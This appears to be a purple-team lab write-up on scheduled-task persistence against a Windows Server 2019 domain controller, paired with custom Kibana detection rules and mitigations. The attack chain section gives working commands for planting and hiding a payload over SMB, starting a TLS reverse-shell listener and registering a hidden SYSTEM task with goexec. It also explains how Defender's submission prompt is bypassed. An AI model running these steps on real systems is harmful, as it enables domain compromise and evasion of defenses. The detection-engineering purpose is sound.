# Scheduled Task Persistence & Detection Engineering
## Windows Server 2019 DC — Purple Team Lab

**Platform:** Windows Server 2019 (DC01.lab2019.local)  
**Attacker:** Kali Linux — goexec, ncat, impacket  
**Defender:** ELK SIEM (Kibana 8.19.12), Sysmon, Winlogbeat, Windows Security Auditing  
**Objective:** Demonstrate credential-based persistence via scheduled task abuse, document SIEM detection gaps, and close them with custom detection rules.

> This is a detection engineering document. The nature of the payload, specific tooling choices, and certain implementation details are intentionally omitted or generalised. Specific tool versions, payload internals, and bypass mechanics are not the focus here — the focus is on what the SIEM sees, what it misses, and what closes the gap. Readers looking for offensive tooling guidance should look elsewhere.

---

## Threat Model

This lab demonstrates a privileged insider scenario — the **rotten apple admin** — or an attacker who has already obtained Domain Admin-equivalent credentials.

In this situation, local endpoint controls can be modified or disabled before execution:
- Defender cloud submission can be turned off via UI or registry
- Local logs and Task Scheduler visibility are accessible
- Scheduled tasks can be created and hidden from the GUI

This is not "game over." It is exactly the scenario that mature detection programs are designed to address.

A privileged user can control the local machine. In this configuration, forwarded logs were off the box and outside the attacker's reach. Sysmon EID 11, Security EID 4698, and Sysmon EID 1 events reached the ELK stack before the reverse shell connected. The attacker owned the endpoint — they did not own the log pipeline.

This is why external, tamper-resistant telemetry and well-tuned detection rules matter. They provide visibility and alerting even when the attacker has administrative access on the target system.

> The credential problem and the insider threat problem are the same problem. The answer is not better endpoint controls that a privileged insider can disable. The answer is immutable external telemetry they cannot reach.

---

## Prerequisites

- Valid domain admin credentials (obtained via prior compromise — Shadow Credentials, RBCD, etc.)
- A custom payload developed and compiled on a separate machine (`ld.exe` + `ld.ps1`) — specifics intentionally omitted
- TLS cert/key pair for encrypted C2 channel
- Network access to the target (SMB port 445 reachable)
- goexec v0.3.0 on attacker

---

## Attack Chain

### 1. Plant Payload Files

An attacker with valid domain admin credentials and network access to the target can drop files directly via SMB — no exploit required. `C:\Windows\Tasks` is the target: a commonly writable system directory historically associated with application control bypass research.

```bash
smbclient //192.168.1.4/C$ -U 'administrator%<PASSWORD>' \
  -c 'put ld.exe Windows\Tasks\ld.exe; put ld.ps1 Windows\Tasks\ld.ps1'
```

### 2. Hide Files from Visual Inspection

Set hidden + system attributes to defeat casual inspection. The attrib command was executed remotely using available remote execution capability with valid domain admin credentials.

```bash
attrib +h +s C:\Windows\Tasks\ld.exe
attrib +h +s C:\Windows\Tasks\ld.ps1
```

**Opsec note:** Hidden from default Explorer view and standard `dir` output. Does **not** hide from:
- `dir /a C:\Windows\Tasks\`
- Sysmon Event ID 11 (FileCreate) — logged at drop time, before attrib is set
- Any SIEM rule monitoring file creation in this path

### 3. Start C2 Listener

TLS-encrypted reverse shell listener on attacker:

```bash
sudo ncat --ssl --ssl-key key.pem --ssl-cert cert.pem -lvnp 8443
```

### 4. Register Scheduled Task via goexec

Remote task creation over TSCH (MS-TSCH RPC). Task runs as `LocalSystem`, hidden from Task Scheduler UI. Task is time-triggered with a short execution window and self-deletes on completion.

```bash
./goexec tsch create 192.168.1.4 \
  -u administrator@lab2019 \
  -p '<PASSWORD>' \
  --dc 192.168.1.4 \
  --task '\ld' \
  --exec 'powershell.exe' \
  --args '-ep bypass -File C:\Windows\Tasks\ld.ps1'
```

### 5. Shell Received

```
Ncat: Connection from 192.168.1.4
SHELL> whoami
nt authority\system
SHELL> hostname
DC01
```

---

## Defender Behavior — Windows Defender + AMSI

Defender intercepted the payload via **AMSI stream scanning** during shell execution, not just static file analysis. Default configuration, fully patched, real-time protection enabled.

Defender is not silent here. Credit where it is due.

### Observed behavior

| Event | Detail |
|---|---|
| Sample submission prompt | `C:\Windows\Tasks\ld.ps1` + AMSI stream ID flagged |
| Prompt type | GUI dialog — "Send selected / Don't send" |
| Shell stability | Breaks mid-session if prompt not dismissed |
| Trigger command | `dir` on high-volume directories (e.g. `C:\Windows\system32`) — large AMSI stream output crosses scan threshold. Targeted navigation (`cd`, `type`, specific paths) does not trigger it. |
| Fix (interactive) | Attacker clicks "Don't send" — preference persists until reboot |
| Fix (pre-execution) | Registry key silently removes the prompt entirely — no reboot required until next restart restores it |

### Shell stability caveat

The shell is not unconditionally stable. Large output streams — for example, `dir` against high-volume directories — appear to trigger deeper AMSI inspection, resulting in session instability and connection drop. Targeted navigation (`cd`, `type`, specific known paths) does not exhibit this behavior.

This is a real limitation and worth noting honestly. An attacker who knows their target path navigates directly.

### Automatic cloud submission

In this test, automatic cloud-based sample submission was **off**. The GUI prompt was the only gate between Defender's detection and the attacker continuing the session. One click — "Don't send" — and the shell proceeds.

### Insider threat scenario

An insider threat, or an attacker with prior interactive access to the machine, can disable sample submission directly via the Windows Security UI or registry before dropping the payload. From that point the prompt never appears and the shell runs without interruption — subject to the `dir` stability caveat above.

This is not an exploit — it is a configurable setting exposed via UI and registry.

### Key finding

Defender did its job. It flagged the payload, it prompted for submission, it scanned the AMSI stream mid-session. The gap is not Defender's detection capability — it is the enforcement model. A user-clickable prompt is not a sufficient control on its own. Automatic sample submission enforced via GPO is.

```
# Enforce via GPO — remove user-clickable prompt
HKLM\SOFTWARE\Microsoft\Windows Defender\Spynet\SubmitSamplesConsent = 3
# (Send all samples automatically — no prompt)
```

---

## SIEM Telemetry — Pre Rule Creation

Sysmon and Windows Security logs captured the full attack. **No alert rules existed to fire on any of it.**

### What was logged

| Time | Event | Detail |
|---|---|---|
| Drop | Sysmon EID 11 | FileCreate — `ld.ps1`, `ld.exe` in `C:\Windows\Tasks\` |
| Task registration | Security EID 4698 | Scheduled task `\ld` created — full XML including `Hidden: true`, `LocalSystem`, `-ep bypass` |
| Defender inspection | Sysmon EID 1 | `notepad.exe` opening `ld.ps1` from `C:\Windows\Tasks\` — Defender's content inspection spawns transient processes visible in Sysmon telemetry |
| Execution | Sysmon EID 1 | Child processes (`whoami.exe`, `ping.exe`, `hostname.exe`, `ipconfig.exe`) with `ParentCommandLine: "powershell.exe" -ep bypass -File C:\Windows\Tasks\ld.ps1` |

### What fired (pre-rule)

**One existing rule fired:** `Sysmon - Binary Execution from Windows Tasks` (custom, risk score 73)

**What it caught:** `notepad.exe` opening `ld.ps1` — Defender's own inspection process, not the malicious execution.

**What it missed:** The actual scheduled task execution and all child processes.

### Detection gap

The telemetry was complete. The gap was purely a **rules gap, not a visibility gap.**

---

## SIEM Telemetry — Post Rule Creation

### Rule 1 — PowerShell Execution from Windows Tasks with Bypass

**Rationale:** The powershell.exe EID 1 event was not captured directly. However, every child process it spawned carries the full `ParentCommandLine`. Hunt the children, not the parent.

**KQL:**
```kql
event.provider: "Microsoft-Windows-Sysmon" AND
event.code: "1" AND
winlog.event_data.ParentCommandLine: *Tasks* AND
winlog.event_data.ParentCommandLine: *bypass*
```

**Settings:**

| Field | Value |
|---|---|
| Severity | High |
| Risk Score | 73 |
| Interval | 5m |
| Look-back | 1m |
| Tags | Sysmon, Defense-Evasion, Persistence, T1053.005 |

**Result:** Fired on every child process across all attack sessions — `whoami.exe`, `ping.exe`, `hostname.exe`, `ipconfig.exe`. Both historical (manual backfill) and live (scheduled execution within 2 minutes of attack).

**Sample alert fields:**

```
Image:             C:\Windows\System32\whoami.exe
ParentCommandLine: "powershell.exe" -ep bypass -File C:\Windows\Tasks\ld.ps1
ParentImage:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User:              NT AUTHORITY\SYSTEM
IntegrityLevel:    System
TerminalSessionId: 0  ← non-interactive, scheduled task context
```

---

### Rule 2 — Scheduled Task Created in Windows Tasks Directory

**Rationale:** Catches the attack at the **drop stage** — task registration via goexec — before execution. Earlier detection point than Rule 1.

**KQL:**
```kql
event.provider: "Microsoft-Windows-Security-Auditing" AND
event.code: "4698" AND
winlog.event_data.TaskContent: *Windows\\Tasks*
```

**Settings:**

| Field | Value |
|---|---|
| Severity | High |
| Risk Score | 75 |
| Interval | 5m |
| Look-back | 1m |
| Tags | Persistence, T1053.005, ScheduledTask |

**Result:** Fired immediately on task registration. Alert contained the full task XML.

**Notable fields in alert:**

```xml
<Command>powershell.exe</Command>
<Arguments>-ep bypass -File C:\Windows\Tasks\ld.ps1</Arguments>
<UserId>S-1-5-18</UserId>       ← LocalSystem
<Hidden>true</Hidden>            ← explicitly hidden from Task Scheduler UI
SubjectUserName: Administrator   ← who created it
```

The `Hidden: true` flag is rare in legitimate scheduled tasks and high-signal when combined with other indicators such as `LocalSystem` execution context, `-ep bypass`, and a script path in `C:\Windows\Tasks`. Without SIEM coverage, a sysadmin checking Task Scheduler GUI would not see this task.

---

## Detection Summary

| Stage | Data Source | Event | Rule | Status |
|---|---|---|---|---|
| File drop | Sysmon EID 11 | FileCreate in `C:\Windows\Tasks\` | Not written | Gap |
| Task registration | Security EID 4698 | Task `\ld` created, `Hidden: true` | Rule 2 | **Closed** |
| Execution | Sysmon EID 1 | PowerShell child processes | Rule 1 | **Closed** |
| Defender inspection | Sysmon EID 1 | notepad.exe → ld.ps1 | Existing rule | Noisy |
| Sample submission disabled | Registry EID 13 | Defender config change | Not written | Gap |

---

## Remaining Gaps

1. **Sysmon EID 11** — no rule on file creation in `C:\Windows\Tasks\`. Catches the drop before execution.
2. **Registry modification** — Sysmon EID 13 on `HKLM\SOFTWARE\Microsoft\Windows Defender\Spynet\SubmitSamplesConsent`. Catches Defender degradation silently applied pre-execution.
3. **Credential problem** — everything above assumes credentials are already compromised. That is the upstream gap all detection layering sits on top of.

---

## Mitigations

| Control | Detail |
|---|---|
| Enforce sample submission via GPO | Remove user-clickable prompt — `SubmitSamplesConsent` = 3 (Send all samples automatically) |
| Monitor Defender config changes | Sysmon EID 13 on Defender registry keys |
| Alert on EID 4698 | All scheduled task creation, not just Tasks path |
| Alert on Sysmon EID 11 | FileCreate in `C:\Windows\Tasks\` |
| Restrict write access to Tasks | Non-admin accounts should not write here |
| Credential hygiene | Tier-0 admin credentials must not be exposed to lateral movement paths |

---

## Tools Used

| Tool | Purpose |
|---|---|
| goexec v0.3.0 | Remote scheduled task registration and command execution via MS-TSCH |
| ncat (TLS) | Encrypted reverse shell listener |
| Sysmon | Process creation, file creation telemetry |
| Winlogbeat 8.19.12 | Log shipping to ELK |
| Kibana 8.19.12 | SIEM alerting and rule creation |

---

## MITRE ATT&CK

| Technique | ID |
|---|---|
| Scheduled Task/Job: Scheduled Task | T1053.005 |
| Hide Artifacts: Hidden Files and Directories | T1564.001 |
| Defense Evasion: Impair Defenses | T1562.001 |
| Execution: PowerShell | T1059.001 |
| Lateral Movement: Remote Services | T1021 |

---
<img width="1608" height="784" alt="MoneySHotALERTS25032026" src="https://github.com/user-attachments/assets/cac4d1c5-6f1a-444c-b2bd-4d1c768e045e" />
<img width="1602" height="871" alt="systemshellgoexec" src="https://github.com/user-attachments/assets/b448a849-badb-4a2b-9fcc-6c0b327a8bd1" />
<img width="1763" height="856" alt="shellDC2" src="https://github.com/user-attachments/assets/6b00e171-7f56-41eb-803f-f5c0d2bb12d6" />
<img width="1412" height="828" alt="shellDC1" src="https://github.com/user-attachments/assets/7a491e4c-b5ec-4eec-8a65-0f72ec8eb786" />
<img width="1314" height="921" alt="image" src="https://github.com/user-attachments/assets/e629445a-2377-489e-ab3e-40ad042fdc86" />
<img width="819" height="666" alt="image" src="https://github.com/user-attachments/assets/63e4df99-458d-4d88-8491-7b365b568641" />
<img width="1601" height="713" alt="image" src="https://github.com/user-attachments/assets/6469f2a4-91a7-4ee7-9949-890521c3bfcc" />







*Lab environment. All credentials redacted. Do not use against systems you do not own or have explicit written permission to test.*
